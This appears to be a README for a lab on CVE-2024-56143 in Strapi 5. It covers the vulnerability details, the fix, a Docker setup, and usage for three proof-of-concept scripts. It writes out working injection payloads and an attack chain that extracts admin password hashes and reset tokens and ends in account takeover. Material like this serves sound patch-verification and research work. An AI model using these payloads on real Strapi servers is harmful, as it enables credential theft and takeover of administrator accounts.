# CVE-2024-56143 - Strapi 5 IDOR via lookup Parameter Injection

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2024-56143 |
| Component | [Strapi](https://github.com/strapi/strapi) |
| Type | CWE-639: Authorization Bypass Through User-Controlled Key |
| CVSS | 8.2 (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` |
| EPSS | 0.04% |
| Affected | Strapi >= 5.0.0, < 5.5.2 (`@strapi/core`) |
| Fix | Upgrade to Strapi 5.5.2+ |
| Author | Exploit Intelligence Platform |
| Date | 2025-10-16 |

## Vulnerability Details

CVE-2024-56143 is an Insecure Direct Object Reference (IDOR) vulnerability in Strapi 5 that allows **unauthenticated** attackers to extract private field values — including admin password hashes, email addresses, and password reset tokens — through the public content API.

The `lookup` query parameter is an internal document-service parameter designed for publication status and locale filtering. However, it is never stripped by `sanitizeQuery()` or `validateParams()`, allowing it to be injected via HTTP GET requests and spread directly into database WHERE clauses via `transformParamsToQuery()`.

An attacker can perform blind boolean-based enumeration to reconstruct any private field value character-by-character — observing whether results are returned or not for each guess.

### Attack Chain

```
1. Discover public content type endpoint (e.g., GET /api/articles)
2. Inject lookup parameter: ?lookup[createdBy][password][$startsWith]=<guess>
3. Iterate through charset to extract admin bcrypt hash (60 chars, ~1920 requests)
4. Alternatively: extract email, trigger password reset, extract reset token
5. Use extracted token to reset admin password → full account takeover
```

### Fix

Strapi 5.5.2 adds a validation check in `validateParams()` that rejects any request containing the `lookup` parameter before it reaches the database layer:

```diff
+ if (params.lookup) {
+   throw new errors.ValidationError("Invalid params: 'lookup'");
+ }
```

## Lab Setup

### Architecture

```
┌──────────────────────────────────────────┐
│  cve-2024-56143-vulnerable               │
│  ┌────────────────────────────────────┐  │
│  │  Strapi 5.5.1 (Node.js 20)        │  │
│  │  Port: 1337                        │  │
│  │  Database: SQLite (.tmp/data.db)   │  │
│  │  Content Type: Article (public)    │  │
│  │  Admin: admin@lab.local            │  │
│  └────────────────────────────────────┘  │
└──────────────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2024-56143

# Build and start
docker compose build
docker compose up -d

# Wait for Strapi to initialize (~30-60s on first boot)
docker compose ps   # wait until healthy

# Run the exploits
python3 poc.py localhost 1337 articles
python3 poc_vector2.py localhost 1337 articles
python3 poc_vector3.py localhost 1337 articles

# Cleanup
docker compose down -v
```

### Container Details

| Container | Role | Base | Host Port | Description |
|---|---|---|---|---|
| `cve-2024-56143-vulnerable` | Strapi 5.5.1 | `node:20-slim` | `1337` | Vulnerable Strapi with SQLite and pre-configured content |

### Default Credentials

| Service | Username | Password |
|---|---|---|
| Strapi Admin | `admin@lab.local` | `Admin12345!` |

## PoC Usage

Three PoC scripts are provided, each demonstrating a different attack vector. All are standalone Python 3 tools with **no external dependencies** (stdlib only).

### Vector 1: Blind Password Hash Extraction (`poc.py`)

Extracts the admin user's bcrypt password hash through blind boolean-based inference.

```bash
python3 poc.py <target_host> [port] [content_type]

# Run against the lab
python3 poc.py localhost 1337 articles
```

### Vector 2: Admin Email Enumeration (`poc_vector2.py`)

Extracts admin email addresses via the same lookup injection targeting the `email` field.

```bash
python3 poc_vector2.py <target_host> [port] [content_type]

# Run against the lab
python3 poc_vector2.py localhost 1337 articles
```

### Vector 3: Full Account Takeover Chain (`poc_vector3.py`)

Complete escalation: email extraction → password reset trigger → reset token extraction → password reset → admin login.

```bash
python3 poc_vector3.py <target_host> [port] [content_type]

# Run against the lab
python3 poc_vector3.py localhost 1337 articles
```

### Expected Output (Vector 1 — Vulnerable)

```
======================================================================
  CVE-2024-56143: Strapi 5 Blind IDOR — Password Hash Extraction
  Target: http://localhost:1337/api/articles
======================================================================

[*] Step 1: Confirming vulnerability...
[+] VULNERABLE! Lookup parameter injection confirmed.

[*] Step 2: Extracting admin password hash (up to 60 chars)...
  [+] Position  1: '$' → $
  [+] Position  2: '2' → $2
  ...
  [+] Position 60: 'S' → $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCYSCYUTLNUZGVS

======================================================================
  RESULTS
======================================================================
  Extracted Hash: $2A$10$RZUTQLNWPQ/IOKNYQQU48UE7GHBOKYTAD1ICDLFCYSCYUTLNUZGVS
  Hash Length:    60 characters
  [+] SUCCESS: Full bcrypt hash extracted!
======================================================================
```

## Verification: Vulnerable vs Patched

| Test | Vulnerable (5.5.1) | Patched (5.5.2) |
|---|---|---|
| `?lookup[createdBy][password][$startsWith]=$2` | `200 OK` — returns articles (match) | `400 Bad Request` — `"Invalid params: 'lookup'"` |
| `?lookup[createdBy][password][$startsWith]=WRONG` | `200 OK` — empty array (no match) | `400 Bad Request` — `"Invalid params: 'lookup'"` |
| `?lookup[createdBy][email][$startsWith]=admin` | `200 OK` — returns articles | `400 Bad Request` — `"Invalid params: 'lookup'"` |

## Files

| File | Description |
|---|---|
| `poc.py` | Vector 1 — Blind bcrypt password hash extraction |
| `poc_vector2.py` | Vector 2 — Admin email enumeration |
| `poc_vector3.py` | Vector 3 — Full account takeover chain |
| `Dockerfile.vulnerable` | Strapi 5.5.1 with SQLite lab image |
| `docker-compose.yml` | Lab orchestration |
| `setup-strapi.sh` | Entrypoint: auto-configures admin, content type, permissions |
| `config/` | Strapi configuration files |
| `package.json` | Node.js project dependencies |
| `article-schema.json` | Article content type schema |

## References

- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2024-56143)
- [GitHub Security Advisory (GHSA-495j-h493-42q2)](https://github.com/strapi/strapi/security/advisories/GHSA-495j-h493-42q2)
- [Fix Commit](https://github.com/strapi/strapi/commit/0c6e0953ae1e62afae9329de7ae6d6a5e21b95b8)
- [Fix Pull Request #22454](https://github.com/strapi/strapi/pull/22454)

## Timeline

| Date | Event |
|---|---|
| 2024 | Vulnerability introduced in Strapi 5.0.0 |
| 2025-10-16 | CVE-2024-56143 published / GHSA-495j-h493-42q2 disclosed |
| 2025-10-16 | Fix released in Strapi 5.5.2 |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2024-56143 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
